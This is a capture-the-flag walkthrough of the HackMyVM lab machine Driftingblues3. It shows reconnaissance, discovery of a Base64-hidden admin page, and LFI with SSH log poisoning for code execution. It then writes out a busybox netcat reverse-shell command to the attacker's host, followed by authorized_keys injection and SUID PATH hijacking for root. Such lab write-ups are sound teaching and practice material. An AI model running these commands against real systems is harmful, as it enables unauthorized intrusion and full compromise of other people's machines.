# Driftingblues3

## Executive Summary

| Machine | Author | Category | Platform |
| --- | --- | --- | --- |
| **Driftingblues3** | **tasiyanci** | **Beginner** | **HackMyVM** |

**Summary:**  Driftingblues3 is a beginner-level Linux machine that focuses on web enumeration, **Local File Inclusion (LFI)** leading to **Log Poisoning**, and SUID-based privilege escalation. The attack vector begins with the discovery of a hidden administrative PHP page, obscured through multiple layers of Base64 encoding within a music-themed HTML file. This page is vulnerable to LFI as it renders the system's SSH authentication logs (`/var/log/auth.log`).

By leveraging a PHP web shell embedded within the SSH logs, Remote Code Execution (RCE) is achieved as the `www-data` user. Initial post-exploitation reveals a misconfigured, world-writable `.ssh` directory for the user `robertj`, enabling lateral movement via SSH authorized keys injection. Finally, privilege escalation to root is performed by exploiting a custom SUID binary, `getinfo`, which is susceptible to a **PATH hijacking** attack due to its use of relative paths when calling system utilities.

---

## Recon

The first step is to identify the target machine's IP address on the local network using `arp -a`:

```powershell
PS C:\Windows\System32> arp -a

Interface: 192.168.100.1 --- 0x3
  Internet Address      Physical Address      Type
  192.168.100.19        08-00-27-cd-e8-02      dynamic
```

Target IP: **192.168.100.19**

Next, a full port scan is conducted using `nmap` to identify running services and versions:

```bash
.....[SNIP].....
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-robots.txt: 1 disallowed entry
|_/eventadmins
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
.....[SNIP].....
```

**Open Ports:**

* **Port 22 (SSH):** Standard OpenSSH service.
* **Port 80 (HTTP):** Running Apache with a `robots.txt` file pointing to a `/eventadmins` directory.

---

## Web Enumeration

Initial directory fuzzing was performed using `feroxbuster` with a medium wordlist to find hidden files and directories:

```bash

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ feroxbuster -u http://192.168.100.19/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt -t 50 --collect-backups -d 2

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.19/
 🚩  In-Scope Url          │ 192.168.100.19
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt]
 🏦  Collect Backups       │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      318c http://192.168.100.19/privacy => http://192.168.100.19/privacy/
200      GET       42l      133w     1373c http://192.168.100.19/index.html
200      GET       16l       34w      347c http://192.168.100.19/tickets.html
200      GET        2l        4w       37c http://192.168.100.19/robots.txt
301      GET        9l       28w      322c http://192.168.100.19/eventadmins => http://192.168.100.19/eventadmins/
200      GET       11l       34w      285c http://192.168.100.19/eventadmins/index.html
200      GET     3291l    19715w  2014591c http://192.168.100.19/cr.png
200      GET       42l      133w     1373c http://192.168.100.19/
200      GET        1l        1w      179c http://192.168.100.19/privacy/index.html
301      GET        9l       28w      317c http://192.168.100.19/drupal => http://192.168.100.19/drupal/
200      GET        1l        1w      357c http://192.168.100.19/drupal/index.html
301      GET        9l       28w      317c http://192.168.100.19/secret => http://192.168.100.19/secret/
200      GET        1l        1w       11c http://192.168.100.19/Makefile
301      GET        9l       28w      319c http://192.168.100.19/wp-admin => http://192.168.100.19/wp-admin/
200      GET       97l      823w     7345c http://192.168.100.19/wp-admin/readme.html
200      GET        1l        1w       90c http://192.168.100.19/secret/index.html
200      GET        1l        3w       20c http://192.168.100.19/secret/devices
301      GET        9l       28w      321c http://192.168.100.19/phpmyadmin => http://192.168.100.19/phpmyadmin/
```

The scan revealed several interesting endpoints:

* `/robots.txt`
* `/eventadmins/`
* `/littlequeenofspades.html`
* `/secret/`
* `/phpmyadmin/`

### Investigating Hidden Clues

Browsing to `/eventadmins/index.html` provides a hint about a "poisonous" SSH issue and mentions another file:

```html
...
<p>john said "it's poisonous!!! stay away!!!"</p>
<p>also check /littlequeenofspades.html</p>
...
```

Visiting `http://192.168.100.19/littlequeenofspades.html` shows lyrics to a Robert Johnson song, but inspecting the source code reveals a hidden Base64 string:

`aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==`

Decoding this string reveals a second Base64 layer:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo "aW50cnVkZXI/IEwyRmtiV2x1YzJacGVHbDBMbkJvY0E9PQ==" | base64 -d
intruder? L2FkbWluc2ZpeGl0LnBocA==
```

Decoding the second part reveals the hidden administrative page:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ echo "L2FkbWluc2ZpeGl0LnBocA==" | base64 -d
/adminsfixit.php
```

---

## Vulnerability Discovery

### Local File Inclusion (LFI)
The page `/adminsfixit.php` was found to be vulnerable to Local File Inclusion (LFI). The application appears to use a PHP `include()` function to render the system's SSH authentication logs located at `/var/log/auth.log`.

This is a critical flaw because it allows an attacker to execute PHP code if they can inject it into the log file, a technique known as Log Poisoning.

## Init Access

### Log Poisoning to RCE
By attempting an SSH login with a PHP payload as the username, the payload is recorded in the authentication logs. When `/adminsfixit.php` includes that log file, the PHP engine executes the code.

 > Note: In this environment, the log was already poisoned with a web shell compatible with the cmd parameter, allowing for direct Remote Code Execution (RCE).

To verify the vulnerability, I tested the RCE by passing the `id` command via the `cmd` parameter in the URL:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl http://192.168.100.19/adminsfixit.php?cmd=id
...
Jan 21 07:57:07 driftingblues sshd[1920]: Bad protocol version identification 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
...
```

### Reverse Shell

With RCE confirmed, I initiated a reverse shell. First, I set up a listener on my local machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

Then, I executed the reverse shell payload via `curl`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ curl -G --data-urlencode "cmd=busybox nc 192.168.100.1 4444 -e /bin/bash" http://192.168.100.19/adminsfixit.php
```

After catching the shell, I upgraded it to a fully interactive TTY:

```bash
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 59554
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@driftingblues:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@driftingblues:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@driftingblues:/var/www/html$ export TERM=xterm-256color
```

### Lateral Movement: robertj

The machine has a user named `robertj`. Checking his home directory, I found that the `.ssh` directory had insecure permissions (`rwx` for others):

```bash
www-data@driftingblues:/home/robertj$ ls -la
drwx---rwx 2 robertj robertj 4096 Jan 21 07:22 .ssh
```

I injected my own SSH public key into his `authorized_keys` file to gain access as his user:

```bash
www-data@driftingblues:/home/robertj/.ssh$ echo "ssh-rsa [MY_PUBLIC_KEY] ouba@CLIENT-DESKTOP" > authorized_keys
```

Now, I can log in directly via SSH:

```bash
┌──(root㉿CLIENT-DESKTOP)-[~/.ssh]
└─# ssh -i id_rsa robertj@192.168.100.19
robertj@driftingblues:~$ id
uid=1000(robertj) gid=1000(robertj) groups=1000(robertj),1001(operators)
```

---

## PrivEsc

### SUID Exploration

Searching for SUID binaries revealed an unusual custom binary:

```bash
robertj@driftingblues:~$ find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null
...
-r-sr-s--- 1 root operators 16704 Jan  4  2021 /usr/bin/getinfo
...
```

The binary `/usr/bin/getinfo` belongs to `root` and the `operators` group (which `robertj` is a member of). Running it reveals that it executes several system commands like `ip addr`, `cat /etc/hosts`, and `uname -a`.

### PATH Hijacking

The binary appears to call the `ip` command without using its absolute path (`/sbin/ip`). This allows for a **PATH Hijacking** attack.

1. Navigate to `/tmp`.
2. Create a malicious file named `ip`.
3. Add `/bin/bash` to the file.
4. Modify the `PATH` environment variable to look in `/tmp` first.

```bash
robertj@driftingblues:~$ cd /tmp
robertj@driftingblues:/tmp$ echo "/bin/bash" > ip
robertj@driftingblues:/tmp$ chmod +x ip
robertj@driftingblues:/tmp$ export PATH=/tmp:$PATH
```

Now, when `/usr/bin/getinfo` is executed, it searches for `ip`, finds our malicious script in `/tmp`, and executes it with root privileges:

```bash
robertj@driftingblues:/tmp$ /usr/bin/getinfo
###################
ip address
###################

root@driftingblues:/tmp# id
uid=0(root) gid=1000(robertj) groups=1000(robertj),1001(operators)
root@driftingblues:/tmp# whoami
root
root@driftingblues:/tmp# cat /root/root.txt /home/robertj/user.txt
[REDACTED]
[REDACTED]
```